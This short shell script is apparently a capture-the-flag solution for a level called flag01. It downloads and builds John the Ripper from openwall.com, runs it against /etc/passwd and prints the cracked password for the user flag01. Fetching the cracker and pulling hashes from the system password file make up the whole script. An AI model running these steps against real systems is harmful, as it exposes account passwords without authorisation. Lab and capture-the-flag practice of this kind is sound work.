#!/bin/sh
# First download john the ripper :
cd /tmp;
curl -O https://www.openwall.com/john/k/john-1.9.0.tar.gz;
tar -xvf /tmp/john-1.9.0.tar.gz;
cd /tmp/john-1.9.0/src;
make clean generic;

# run the ripper on it :
/tmp/john-1.9.0/run/john /etc/passwd
echo -n "Flag01 - password : "
/tmp/john-1.9.0/run/john --show /etc/passwd | grep flag01 | cut -d ':' -f 2
